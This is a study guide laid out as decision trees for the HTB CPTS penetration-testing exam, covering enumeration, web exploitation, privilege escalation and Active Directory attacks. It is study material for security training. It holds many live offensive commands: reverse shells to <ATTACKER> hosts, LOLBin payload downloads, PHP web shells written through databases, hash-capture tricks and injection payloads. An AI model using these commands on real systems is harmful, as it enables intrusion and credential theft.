# CPTS Exam Methodology: The Master Guide

> **Exhaustive, tool-by-tool, decision-driven methodology for the HTB CPTS exam.**
> Based on complete analysis of all 27 CPTS Academy modules. Every attack, every tool, every bypass.

---

## Table of Contents

1. [Phase 0: Pre-Engagement Setup](#phase-0-pre-engagement-setup)
2. [Phase 1: Information Gathering & Enumeration](#phase-1-information-gathering--enumeration)
3. [Phase 2: Vulnerability Assessment](#phase-2-vulnerability-assessment)
4. [Phase 3: Exploitation](#phase-3-exploitation)
5. [Phase 4: Post-Exploitation & Privilege Escalation](#phase-4-post-exploitation--privilege-escalation)
6. [Phase 5: Active Directory Domain Dominance](#phase-5-active-directory-domain-dominance)
7. [Phase 6: Lateral Movement & Pivoting](#phase-6-lateral-movement--pivoting)
8. [Phase 7: Documentation & Reporting](#phase-7-documentation--reporting)
9. [Quick Reference Cheat Sheets](#quick-reference-cheat-sheets)

---

## Phase 0: Pre-Engagement Setup

### Before You Start the Exam

```
START
  │
  ├─► Set up folder structure:
  │     Project/
  │     ├── scans/
  │     ├── evidence/
  │     │   ├── credentials/
  │     │   └── screenshots/
  │     ├── logs/
  │     ├── tools/
  │     └── notes.md
  │
  ├─► Start tmux session (prefix: Ctrl+B)
  │     ├── Window 0: Main enumeration
  │     ├── Window 1: Exploitation
  │     ├── Window 2: Post-exploitation / AD attacks
  │     └── Window 3: Notes/Documentation
  │
  ├─► Verify VPN connectivity
  │     sudo openvpn user.ovpn
  │     ifconfig tun0
  │
  ├─► Prepare cheat sheets & tools
  │     ├── SecLists wordlists
  │     ├── Static binaries (socat, nc, chisel)
  │     ├── LinPEAS/WinPEAS
  │     ├── BloodHound.py, Impacket toolkit
  │     └── Responder, Kerbrute
  │
  ├─► Start Responder IMMEDIATELY if internal network
  │     sudo responder -I <interface> -dwf
  │     (Capture hashes passively while you work)
  │
  ├─► Start Inveigh IMMEDIATELY if on Windows pivot host
  │     # PowerShell-based LLMNR/NBT-NS/mDNS/DNS poisoning
  │     Invoke-Inveigh -IP <local_IP> -ConsoleOutput Y
  │     # OR C# version: Inveigh.exe
  │     (Captures hashes on Windows when Responder can't run)
  │
  └─► Prepare custom wordlists & rules
        ├── CeWL for custom wordlists: cewl -d 2 -m 5 http://<target> -w wordlist.txt
        ├── Username mutation: username-anarchy -i names.txt > mutated_users.txt
        ├── Hashcat rules: /usr/share/hashcat/rules/best64.rule
        ├── Custom password mutations:
        │     hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
        │     hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule > mutated2.txt
        │     hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule > toggled.txt
        └── Username lists: /opt/Username-Generator/username-generator.py
```

---

## Phase 1: Information Gathering & Enumeration

### 1A: Network-Level Enumeration

```
TARGET IP / NETWORK RECEIVED
  │
  ├─► Is this a single host or network range?
  │     ├── SINGLE HOST ──► Go to 1B: Host Enumeration
  │     └── NETWORK RANGE ──► Host Discovery First
  │           sudo nmap <CIDR> -sn -oA tnet | grep for | cut -d" " -f5
  │           fping -asgq <CIDR> 2>/dev/null
  │           │
  │           └── For each live host ──► Go to 1B
  │
  ├─► Passive network analysis (if internal)
  │     sudo responder -I <interface> -A    (Analyze mode, no poisoning)
  │     sudo tcpdump -i <interface>          (Capture traffic)
  │     sudo -E wireshark                    (GUI analysis)
  │     │
  │     └── Look for: hostnames via MDNS, ARP, LLMNR, NBT-NS
  │
  └─► Do you have credentials already?
        ├── YES ──► Authenticated scanning (Nessus, Nmap --script with creds)
        └── NO  ──► Unauthenticated enumeration (default path)
```

### 1B: Host Enumeration — The Core Decision Tree

```
LIVE HOST IDENTIFIED
  │
  ├─► STEP 1: Quick Port Scan (top 1000)
  │     nmap -sC -sV --top-ports=1000 <IP> -oA initial
  │     │
  │     └── While that runs, start ALL-PORT scan in background:
  │           nmap -p- -sV -sC <IP> -oA fullscan &
  │
  ├─► STEP 2: Determine OS from scan results
  │     │
  │     ├── WINDOWS INDICATORS:
  │     │   - Port 3389 (RDP)
  │     │   - Port 5985/5986 (WinRM)
  │     │   - Port 135 (MSRPC)
  │     │   - Port 139+445 (SMB) with Windows details
  │     │   - Port 88 (Kerberos) ──► Active Directory environment!
  │     │   - Port 389/636/3268/3269 (LDAP) ──► Domain Controller!
  │     │   └──► Go to WINDOWS ENUMERATION path
  │     │
  │     └── LINUX INDICATORS:
  │         - Port 22 (SSH) with OpenSSH
  │         - Port 80/443 with Apache/Nginx
  │         - Port 139+445 with Samba
  │         └──► Go to LINUX ENUMERATION path
  │
  ├─► STEP 3: UDP Scan (if TCP yields little)
  │     sudo nmap -sU --top-ports=100 <IP> -oA udp_scan
  │     (Look for: SNMP 161, DNS 53, TFTP 69, LDAP 389, IPMI 623)
  │
  └─► STEP 4: SSL/TLS Certificate Analysis
        openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -text
        │
        └── Extract: Subject Alternative Names (SANs), email addresses,
              organization, internal hostnames, subdomains
```

### 1C: Nmap Firewall/IDS Evasion Techniques

```
NMAP SCAN BLOCKED OR INCOMPLETE? TRY EVASION:
  │
  ├─► Fragment packets: nmap -f <IP> / nmap -ff <IP>
  ├─► Decoy scan: nmap -D RND:10 <IP> / nmap -D decoy1,decoy2,ME <IP>
  ├─► Spoof source port: nmap --source-port 53 <IP> / --source-port 88 <IP>
  ├─► Adjust data: nmap --data-length 25 <IP> / nmap --mtu 24 <IP>
  ├─► IP protocol: nmap -sO -p 1,6,17 <IP>
  ├─► Timing: nmap -T1 <IP> / nmap --scan-delay 1s <IP> / nmap --max-rate 10 <IP>
  ├─► Idle/Zombie: nmap -sI <zombie_host> <IP>
  ├─► Proxychains: proxychains nmap -sT <IP>
  └─► Combine: nmap -f -D RND:5 --source-port 53 --data-length 25 -T2 <IP>
```

### 1D: OSINT & External Information Gathering

```
EXTERNAL TARGET / DOMAIN RECEIVED
  │
  ├─► STEP 1: WHOIS & Domain Registration
  │     whois <domain> / whois <IP>
  │
  ├─► STEP 2: Passive DNS & Subdomain Enumeration
  │     ├── Certificate Transparency: https://crt.sh/?q=<domain>
  │     ├── Subfinder: subfinder -d <domain> -o subdomains.txt
  │     ├── Amass (passive): amass enum -passive -d <domain> -o amass_results.txt
  │     ├── theHarvester: theHarvester -d <domain> -b all
  │     └── Recon-ng: recon-cli -w <workspace> -m recon/domains-hosts/hackertarget
  │
  ├─► STEP 3: Search Engine Discovery (Google Dorking)
  │     site:<domain> intitle:"index of" / filetype:pdf / inurl:admin / intext:"password"
  │
  ├─► STEP 4: Internet-Wide Scanning Services
  │     ├── Shodan: shodan host <IP> / shodan search <query>
  │     └── Censys: https://search.censys.io/
  │
  ├─► STEP 5: GitHub & Source Code Reconnaissance
  │     ├── Search: site:github.com <domain> password / api_key
  │     ├── GitLeaks: gitleaks detect -r <repo_url>
  │     └── TruffleHog: trufflehog <repo_url>
  │
  ├─► STEP 6: Cloud Resource Discovery
  │     ├── AWS S3: aws s3 ls s3://<bucket> --no-sign-request / cloud_enum -k <keyword>
  │     ├── Azure Blob: cloud_enum -k <keyword>
  │     └── Cloud Metadata (SSRF): curl http://169.254.169.254/latest/meta-data/ (AWS)
  │           curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
  │
  └─► STEP 7: Wayback Machine & Historical Data
        https://web.archive.org/web/*/<domain>/*
```

### 1E: Service-by-Service Enumeration

#### PORT 21 (FTP)

```
PORT 21 (FTP)
  │
  ├─► Anonymous login? ftp <IP> → anonymous:anonymous
  │     ├── YES ──► wget -m --no-passive ftp://anonymous:anonymous@<IP>
  │     └── NO ──► Try default credentials, brute force
  ├─► Can we UPLOAD files? ftp> put test.txt
  │     ├── YES + Web server ──► Upload PHP web shell!
  │     └── NO ──► Continue enumeration
  └─► Version exploits: vsftpd 2.3.4 / ProFTPD 1.3.5 / ProFTPD 1.3.3c
```

#### PORT 22 (SSH)

```
PORT 22 (SSH)
  │
  ├─► Banner grab: nc -nv <IP> 22
  ├─► Have credentials?
  │     ├── YES ──► ssh user@<IP> (preferred — stable, supports port forwarding)
  │     └── NO ──► Check for leaked SSH keys, credential reuse, brute force
  └─► Key-based auth only? ──► Find private key on target/shares
```

#### PORT 25/110/143/993/995 (MAIL SERVICES)

```
MAIL SERVICES
  │
  ├─► Enumerate users via SMTP: smtp-user-enum -U wordlist -M VRFY <IP>
  ├─► Read emails (if credentials obtained): openssl s_client -connect <IP>:993 -quiet
  ├─► Open Relay Check: telnet <IP> 25 → MAIL FROM / RCPT TO
  │     └── If 250 OK ──► swaks --from test@test.com --to target@external.com --server <IP>
  └─► Phishing potential (if in scope)
```

#### PORT 53 (DNS)

```
PORT 53 (DNS)
  │
  ├─► Zone transfer: dig axfr @<IP> <domain>
  ├─► DNS records: dig any <domain> / dig txt <domain> / dig mx <domain>
  ├─► Subdomain brute: dnsenum --enum <domain> / dnsrecon -d <domain> -t std
  ├─► Certificate Transparency: https://crt.sh/?q=<domain>
  └─► AD DNS (if authenticated): adidnsdump -u <domain>\\user -p <pass> <DC_IP>
```

#### PORT 623 (IPMI)

```
PORT 623 (IPMI)
  │
  ├─► Version: nmap -sU -p 623 --script ipmi-version <IP>
  ├─► Dump hashes (RAKP flaw): msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
  │     └── Crack: hashcat -m 7300 ipmi_hashes.txt rockyou.txt
  ├─► Default creds: ADMIN:ADMIN, root:root, admin:admin
  └─► IPMI is VERY common in enterprise — always check!
```

#### PORT 1521 (Oracle TNS)

```
PORT 1521 (Oracle TNS)
  │
  ├─► Enumerate TNS: ./odat.py tnscmd -s <IP> -p 1521 --version
  ├─► Enumerate SID: ./odat.py sidguesser -s <IP> -p 1521
  │     └── Common SIDs: ORCL, XE, ORCLCDB, ORCLPDB1
  ├─► Default creds: scott:tiger, system:oracle, sys:change_on_install
  ├─► With valid creds ──► ODAT toolkit (upload, exec, read, SMB relay)
  └─► git clone https://github.com/quentinhardy/odat.git
```

#### PORT 5900 (VNC)

```
PORT 5900 (VNC)
  │
  ├─► Banner grab: nc -nv <IP> 5900
  ├─► Default/weak creds / Brute force: hydra -P wordlist vnc://<IP>
  └─► VNC password in registry (Windows): reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password
```

#### PORT 80/443/8080/8443 (WEB) ──► See Section 3B: Web Attack Decision Tree

#### PORT 139/445 (SMB)

```
PORT 139/445 (SMB)
  │
  ├─► Enumerate shares: smbclient -N -L \\\\<IP>\\ / crackmapexec smb <IP> --shares / smbmap -H <IP>
  │     ├── NULL session? ──► rpcclient -U "" <IP> / enum4linux -a <IP>
  │     └── Need credentials? ──► Try from other services
  ├─► OS & version: nmap --script smb-os-discovery -p445 <IP> / crackmapexec smb <IP>
  │     ├── Win 7/2008 R2 ──► Check EternalBlue (MS17-010)
  │     └── Samba ──► Check version for CVEs
  ├─► Enumerate users: crackmapexec smb <IP> -u 'user' -p 'pass' --users
  ├─► SMB signing disabled? ──► Potential for NTLM relay!
  ├─► SCF / URL File Attack on writable shares (capture hashes):
  │     [Shell]
  │     Command=2
  │     IconFile=\\<ATTACKER_IP>\share\icon.ico
  │     # When user browses share, NTLM hash sent to you! Capture with Responder.
  └─► GPP passwords (if authenticated): crackmapexec smb <IP> -u user -p pass --gpp-password
```

#### PORT 161 (SNMP)

```
PORT 161 (SNMP)
  │
  ├─► Try default community strings: snmpwalk -v 2c -c public <IP>
  │     ├── SUCCESS ──► Enumerate: process list (creds!), software, users, services
  │     └── FAIL ──► Brute force: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
  └─► SNMPv3? ──► Try default credentials, brute force
```

#### PORT 389/636/88/464 (LDAP/KERBEROS) ──► ACTIVE DIRECTORY PATH

```
LDAP/KERBEROS DETECTED ──► AD ENVIRONMENT!
  │
  ├─► LDAP enumeration: ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
  │     windapsearch -d <domain> --dc <IP> -u "" -U / -C / -G
  ├─► Kerberos user enumeration: kerbrute userenum --dc <IP> -d <domain> userlist.txt
  ├─► AS-REP Roasting: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     └── Crack: hashcat -m 18200 hash.txt rockyou.txt
  ├─► SID Enumeration via RPC: lookupsid.py <domain>/<user>:<pass>@<IP>
  └─► Kerberoasting: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request
        └── Crack: hashcat -m 13100 hash.txt rockyou.txt
```

#### PORT 1433/3306/5432 (DATABASES)

```
DATABASE PORT DETECTED
  │
  ├─► MSSQL (1433)
  │     ├── Default: sa:sa, sa:blank. Connect: mssqlclient.py <user>:<pass>@<IP>
  │     ├── xp_cmdshell: EXEC master..xp_cmdshell 'whoami'
  │     │     Disabled? → EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  │     │                   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  │     ├── Capture hash: EXEC master..xp_dirtree '\\<ATTACKER>\share'
  │     ├── Impersonate: EXEC AS USER = 'sa'; EXEC master..xp_cmdshell 'whoami'
  │     └── Linked servers: EXEC ('whoami') AT [linked_server]
  │
  ├─► MySQL (3306)
  │     ├── Default: root:blank, root:root. Connect: mysql -u root -p -h <IP>
  │     ├── Read: SELECT LOAD_FILE('/etc/passwd')
  │     └── Write shell: SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'
  │
  └─► PostgreSQL (5432)
        ├── Default: postgres:postgres. Connect: psql -U postgres -h <IP>
        ├── Read: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;
        ├── Write shell: COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php';
        └── RCE (if superuser): CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
              BEGIN RETURN cmd; END; $$ LANGUAGE plpgsql
```

#### PORT 2049 (NFS)

```
PORT 2049 (NFS)
  │
  ├─► Show mounts: showmount -e <IP>
  ├─► Mount: sudo mount -t nfs <IP>:/ /mnt/nfs -o nolock
  ├─► Check for: SSH keys, credentials, configs, SUID binaries
  └─► no_root_squash? ──► cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

#### PORT 3389 (RDP)

```
PORT 3389 (RDP)
  │
  ├─► Connect: xfreerdp /v:<IP> /u:user /p:pass +clipboard
  │     xfreerdp /v:<IP> /u:user /pth:<NTLM_HASH>  (Pass-the-Hash)
  ├─► BlueKeep (CVE-2019-0708): nmap --script rdp-vuln-ms12-020 -p3389 <IP>
  └─► Brute force: hydra -l user -P wordlist rdp://<IP>
```

#### PORT 5985/5986 (WinRM)

```
PORT 5985/5986 (WinRM)
  │
  ├─► Connect: evil-winrm -i <IP> -u user -p pass / evil-winrm -i <IP> -u user -H <NTLM_HASH>
  └─► Brute force: crackmapexec winrm <IP> -u users.txt -p passwords.txt
```

---

## Phase 2: Vulnerability Assessment

```
ENUMERATION COMPLETE
  │
  ├─► STEP 1: Organize findings (ports, versions, creds, users, paths)
  ├─► STEP 2: Search for known vulnerabilities
  │     searchsploit <service> <version>
  │     ├── RCE? ──► HIGH PRIORITY
  │     ├── Auth bypass? ──► HIGH PRIORITY
  │     ├── PrivEsc? ──► MEDIUM PRIORITY
  │     └── DoS? ──► LOW PRIORITY (skip)
  ├─► STEP 3: Automated scanning (if time permits)
  │     nmap --script vuln -p<ports> <IP>
  │     nikto -h http://<IP>
  │     nuclei -u http://<IP> -t cves/
  └─► STEP 4: Prioritize
        ├── P1: RCE exploits
        ├── P2: Credential-based access (SSH, SMB, RDP, WinRM)
        ├── P3: Web application vulnerabilities
        ├── P4: Misconfigurations (anonymous FTP, SMB shares)
        └── P5: Brute force (last resort — noisy!)
```

---

## Phase 3: Exploitation

### 3A: Network Service Exploitation

```
VULNERABILITY IDENTIFIED
  │
  ├─► Public exploit available?
  │     ├── YES + Metasploit module ──► msfconsole → search → use → set → exploit
  │     ├── YES + Manual PoC ──► Download, review, modify, execute
  │     └── NO ──► Move to next vulnerability
  │
  ├─► Have valid credentials?
  │     ├── YES ──► SSH / SMB / RDP / WinRM / MSSQL / Web App
  │     └── NO ──► Password attacks (spraying / brute force / credential stuffing)
  │
  └─► Web application exploitation ──► See Section 3B
```

### 3B: Web Attack Decision Tree

```
WEB APPLICATION FOUND
  │
  ├─► STEP 1: Technology Fingerprinting
  │     whatweb http://<IP> / curl -IL http://<IP> / wappalyzer
  │     # Favicon hash lookup:
  │     curl -s http://<IP>/favicon.ico | python3 -c "import mmh3,sys,base64; print(mmh3.hash(base64.b64encode(sys.stdin.buffer.read())))"
  │     # Search Shodan: http.favicon.hash:<hash>
  │
  ├─► STEP 2: Directory/File Enumeration
  │     gobuster dir / ffuf -u http://<IP>/FUZZ -w wordlist
  │     ├── Recursive: ffuf -recursion -recursion-depth 2
  │     ├── Login page? ──► Default creds, brute force
  │     ├── Upload form? ──► File upload attack
  │     ├── Admin panel? ──► Default creds, auth bypass
  │     └── API endpoint? ──► IDOR, auth issues
  │
  ├─► STEP 3: Extension Fuzzing: ffuf -u http://<IP>/index.FUZZ -w extensions.txt
  ├─► STEP 4: Parameter Fuzzing: ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<IP>/index.php?FUZZ=value'
  ├─► STEP 5: Subdomain/VHost: ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w subdomains.txt
  │
  ├─► STEP 6: Check for common web vulns
  │     ├── Source code ──► HTML comments, hidden fields, JS files
  │     ├── robots.txt / sitemap.xml ──► Hidden paths
  │     ├── Certificate ──► Subdomains, emails
  │     ├── Error messages ──► Information disclosure
  │     └── Favicon ──► Framework identification via hash
  │
  └─► STEP 7: Attack specific vulnerability classes
        │
        ├── SQL Injection: ' OR 1=1-- → Union/Error/Blind Boolean/Blind Time
        │     sqlmap -u "URL" --forms --batch --dbs / --level=5 --risk=3 / --tamper
        │
        ├── Command Injection: ; whoami, | id, `id`, $(whoami)
        │     ├── CONFIRMED ──► Reverse shell
        │     └── Filtered? ──► ${IFS}, %09, URL encode, double encode, case variation,
        │           quotes, backslash, reverse, newline %0a, base64 encoded
        │
        ├── XSS: <script>alert(1)</script>
        │     ├── Reflected ──► Cookie stealing: document.cookie
        │     ├── Stored ──► Persistent, affects all users
        │     ├── DOM-based ──► Client-side exploitation
        │     └── Blind XSS ──► XSSHunter, User-Agent, support forms
        │
        ├── File Inclusion (LFI/RFI):
        │     ├── LFI ──► Read files, php://filter, data://, php://input, log poisoning
        │     │     Bypasses: ....// , %252e%252e%252f, null byte %00, path truncation
        │     └── RFI ──► Include remote shell
        │
        ├── SSTI: {{7*7}} / ${7*7} / <%= 7*7 %>
        │     ├── Jinja2 / Twig / ERB
        │
        ├── XXE: Read files, SSRF via XXE, OOB XXE
        │
        ├── SSRF: ?url=http://127.0.0.1:8080
        │     ├── Access internal services: http://127.0.0.1, http://[::1]
        │     ├── Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)
        │     ├── Read local files: file:///etc/passwd
        │     └── Bypasses: 0177.0.0.1, 0x7f000001, xip.io, gopher://
        │
        ├── IDOR: Change user ID, file ID, object reference in URL/cookie/header
        │     └── Access other users' data, modify role in cookie/JWT, automate with Burp
        │
        ├── HTTP Verb Tampering: POST → PUT/PATCH/DELETE
        │     └── Bypass auth when only POST is checked
        │
        ├── CRLF Injection: %0d%0a in URL parameters/headers
        │     └── Inject HTTP headers, response splitting, log injection
        │
        └── Host Header Attack: Change Host header
              └── Password reset poisoning, cache poisoning, SSRF via Host
        │
        ├── FILE UPLOAD:
        │     ├── PHP allowed? ──► Upload web shell
        │     ├── Only images? ──► Double ext, null byte, Content-Type, magic bytes, .phtml/.php5/.phar
        │     ├── .htaccess upload (Apache): AddType application/x-httpd-php .jpg
        │     └── Find upload dir via gobuster/ffuf
        │
        ├── AUTHENTICATION:
        │     ├── Brute force: hydra
        │     ├── Default credentials
        │     ├── Auth bypass: IDOR, force browsing, HTTP Verb Tampering, cookie/JWT manipulation
        │     └── SQLi on login: ' OR 1=1--
        │
        └── SPECIFIC CMS/APP:
              ├── WordPress: wpscan, theme/plugin exploits, XML-RPC, wp-admin
              ├── Drupal: droopescan, Drupalgeddon2, PHP filter module
              ├── Joomla: joomscan, searchsploit
              ├── Tomcat: default creds, /manager/html → deploy WAR
              ├── GitLab: /help version, default creds, public repos
              ├── Jenkins: default creds, Script Console → Groovy RCE
              ├── ColdFusion: default creds, CVE-2010-2861, CVE-2009-2265
              ├── Splunk: default creds, custom app RCE, CVE-2018-11409
              └── osTicket: default creds, CVE-2020-24881, support tickets
```

### 3C: Getting a Shell — Decision Tree

```
READY TO GET A SHELL
  │
  ├─► LINUX:
  │     ├── Reverse shell (RECOMMENDED): nc -lvnp 443 on attacker
  │     │     bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
  │     │     python3 -c 'import socket,subprocess,os;...'
  │     │     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER> <PORT> > /tmp/f
  │     │     msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f elf -o shell.elf
  │     │     Socat full TTY: socat file:`tty`,raw,echo=0 tcp-listen:4444
  │     │
  │     ├── Bind shell (if reverse blocked):
  │     │     Target: nc -lvnp 4444 -e /bin/bash
  │     │     Attacker: nc <TARGET> 4444
  │     │
  │     └── UPGRADE to full TTY:
  │           python3 -c 'import pty;pty.spawn("/bin/bash")'
  │           Ctrl+Z → stty raw -echo; fg → export TERM=xterm
  │
  └─► WINDOWS:
        ├── PowerShell reverse shell (long one-liner)
        ├── Powercat: powercat -c <ATTACKER> -p <PORT> -e cmd.exe
        ├── msfvenom payloads:
        │     Staged: msfvenom -p windows/shell/reverse_tcp ... -f exe
        │     Meterpreter: msfvenom -p windows/meterpreter/reverse_tcp ... -f exe
        │     Stageless: msfvenom -p windows/shell_reverse_tcp ... -f exe
        │     KEY: Staged = smaller, needs handler; Stageless = larger, works with nc
        ├── File transfer: PowerShell IEX, certutil, SMB, FTP, HTTP
        ├── LOLBINs for execution:
        │     rundll32.exe shell.dll,Entry
        │     InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
        │     regsvr32.exe /s /n /u /i:http://<ATTACKER>/shell.sct scrobj.dll
        │     mshta.exe http://<ATTACKER>/shell.hta
        │     bitsadmin /transfer n http://<ATTACKER>/shell.exe C:\Temp\shell.exe
        └── DLL/MSI: msfvenom -f dll / -f msi

  └─► Shell obtained? ──► IMMEDIATELY: whoami/id, hostname, ifconfig/ipconfig, OS version
        └── Go to Phase 4
```

---

## Phase 4: Post-Exploitation & Privilege Escalation

### 4A: Linux Privilege Escalation Decision Tree

```
LINUX SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Stabilize shell
  ├─► STEP 2: Automated enumeration (LinPEAS)
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── sudo -l  ← CRITICAL
  │     │     ├── (ALL : ALL) ALL ──► sudo su
  │     │     ├── NOPASSWD: <cmd> ──► GTFOBins
  │     │     ├── env_keep+=LD_PRELOAD ──► LD_PRELOAD attack
  │     │     │     gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
  │     │     │     void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
  │     │     ├── LD_LIBRARY_PATH ──► Shared Library Hijack
  │     │     │     ldd /path/to/binary → find lib → create malicious .so
  │     │     └── <specific_binary> ──► GTFOBins
  │     │
  │     ├── SUID: find / -perm -4000 2>/dev/null → GTFOBins
  │     │     find, vim, python, nmap, bash, env, cp, tar, less, more
  │     │
  │     ├── CAPABILITIES: getcap -r / 2>/dev/null
  │     │     cap_setuid+ep → python/perl privesc
  │     │     cap_dac_read_search → read any file
  │     │
  │     ├── CRON JOBS: cat /etc/crontab, ls -la /etc/cron.d/, crontab -l
  │     │     Writable cron script? ──► Add reverse shell
  │     │     Also check: systemctl list-timers --all
  │     │
  │     ├── SENSITIVE FILES: /etc/shadow, /etc/passwd, id_rsa, .bash_history, .env, wp-config.php
  │     │
  │     ├── KERNEL EXPLOITS: uname -a → searchsploit
  │     │     PwnKit (CVE-2021-4034) ──► ./PwnKit (very reliable)
  │     │     GameOver(lay) (CVE-2023-2640) ──► Ubuntu OverlayFS
  │     │     Use with CAUTION — may crash!
  │     │
  │     ├── RUNNING SERVICES: ss -tlnp → Port forward internal services
  │     │
  │     ├── CREDENTIALS: grep -ri password /home/ /var/log/ /opt/ 2>/dev/null; env; cat .bash_history
  │     │
  │     ├── NFS: cat /etc/exports → no_root_squash?
  │     ├── DOCKER: id | grep docker → docker run -v /:/mnt --rm -it ubuntu bash
  │     ├── LXD/LXC: id | grep lxd → Alpine container, mount root FS
  │     ├── DISK GROUP: id | grep disk → debugfs /dev/sda1
  │     ├── SNAP: id | grep snap → malicious snap
  │     │
  │     ├── SSH AGENT: ls -la /tmp/ssh-* → SSH_AUTH_SOCK hijack
  │     │     ssh-add -l; SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.XXXX ssh <target>
  │     │
  │     ├── ACLs: getfacl /path/to/file → Special permissions?
  │     │
  │     ├── WRITABLE PATHS: find / -writable -type d 2>/dev/null → $PATH hijack
  │     │
  │     └── STICKY BIT: find / -perm -1000 2>/dev/null (context only)
  │
  └─► STEP 4: Escalate!
        sudo / SUID / Cron / Kernel (PwnKit) / Creds / Capabilities / NFS / Docker /
        Disk / SSH Agent / Internal service / Path hijack
```

### 4B: Windows Privilege Escalation Decision Tree

```
WINDOWS SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Situational Awareness: whoami /all, systeminfo, net user, ipconfig /all
  ├─► STEP 2: Automated enumeration (winPEAS / PowerUp)
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── PRIVILEGES (whoami /priv):
  │     │     ├── SeImpersonatePrivilege ──► Potato attacks!
  │     │     │     Win 2019/10: PrintSpoofer / GodPotato
  │     │     │     Win 2016-: JuicyPotato
  │     │     │     RoguePotato (if JuicyPotato fails on newer)
  │     │     ├── SeBackupPrivilege ──► Dump SAM/SYSTEM/NTDS.dit
  │     │     ├── SeDebugPrivilege ──► Inject into SYSTEM process
  │     │     ├── SeLoadDriverPrivilege ──► Load malicious driver
  │     │     └── SeTakeOwnershipPrivilege ──► Take ownership of any file
  │     │
  │     ├── TOKEN IMPERSONATION: Meterpreter incognito / named pipes
  │     ├── UNQUOTED SERVICE PATHS: wmic service... → Plant malicious binary
  │     ├── SERVICE PERMISSIONS: accesschk.exe → Change binPath
  │     ├── DLL HIJACKING: ProcMon → Place malicious DLL
  │     ├── STORED CREDENTIALS: cmdkey /list → runas /savecred
  │     ├── AUTOLOGON: reg query "HKLM\...\Winlogon" → DefaultPassword
  │     ├── ALWAYS INSTALLED ELEVATED: Both HKCU+HKLM = 1 → Malicious MSI
  │     ├── WIFI PASSWORDS: netsh wlan show profiles
  │     ├── DNS ADMINS: net localgroup "DnsAdmins" → Load malicious DLL
  │     │
  │     ├── DPAPI: dir C:\Users\*\AppData\*\Microsoft\Credentials\
  │     │     mimikatz: dpapi::cred /in:<path>
  │     │     Decrypt: browser passwords, WiFi, credential manager
  │     │
  │     ├── KEEPASS: dir C:\Users\*\*.kdbx /s
  │     │     keepass2john database.kdbx > hash; john hash --wordlist=rockyou.txt
  │     │
  │     ├── BITLOCKER: manage-bde -protectors -get C:
  │     │     Check AD for stored recovery keys
  │     │
  │     ├── PASSWORDS: findstr /si "password" *.txt *.ini *.xml *.config 2>nul
  │     ├── SCHEDULED TASKS: schtasks /query /fo LIST /v
  │     ├── REGISTRY AUTO-RUN: reg query "HKLM\...\Run"
  │     └── INTERNAL SERVICES: netstat -ano → Port forward
  │
  └─► STEP 4: Escalate!
        SeImpersonate / SeBackup / SeDebug / Service misconfig / Unquoted path /
        AlwaysInstallElevated / Stored creds / DnsAdmins / Token impersonation /
        DPAPI / KeePass / Kernel / Pass-the-Hash
```

---

## Phase 5: Active Directory Domain Dominance

### 5A: Initial AD Enumeration (No Credentials)

```
AD ENVIRONMENT DETECTED (Ports 88, 389, 445, 636)
  │
  ├─► STEP 1: Identify the Domain: crackmapexec smb <IP> / nmap -sC -sV
  │
  ├─► STEP 2: LLMNR/NBT-NS Poisoning
  │     ├── Linux (Responder): sudo responder -I <interface> -dwf
  │     ├── Windows (Inveigh): Invoke-Inveigh -IP <local_IP> -ConsoleOutput Y
  │     ├── Captured hash? ──► hashcat -m 5600 hash.txt rockyou.txt
  │     └── Can't crack? ──► NTLM Relay: ntlmrelayx.py -tf targets.txt -smb2support
  │
  ├─► STEP 3: User Enumeration: kerbrute userenum / rpcclient / lookupsid.py
  ├─► STEP 4: AS-REP Roasting: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  └─► STEP 5: Password Spraying: crackmapexec smb / kerbrute passwordspray
```

### 5B: Authenticated AD Enumeration (With Credentials)

```
VALID DOMAIN CREDENTIALS OBTAINED
  │
  ├─► STEP 1: Verify: crackmapexec smb <IP> -u user -p pass
  │
  ├─► STEP 2: BloodHound Collection (CRITICAL!)
  │     bloodhound-python -u user -p pass -d <domain> -c All -ns <DC_IP>
  │     SharpHound.exe -c All  (from Windows)
  │     │
  │     └── Analyze: Path to DA, ACL abuse, delegation, GMSA, LAPS
  │
  ├─► STEP 3: LDAP Enumeration: ldapsearch / windapsearch
  ├─► STEP 4: SMB Share Enumeration + GPP passwords in SYSVOL
  ├─► STEP 5: PowerView: Get-DomainUser/Computer/Group/Trust/OU/GPO
  │     Get-DomainUser -SPN / -PreauthNotRequired
  │
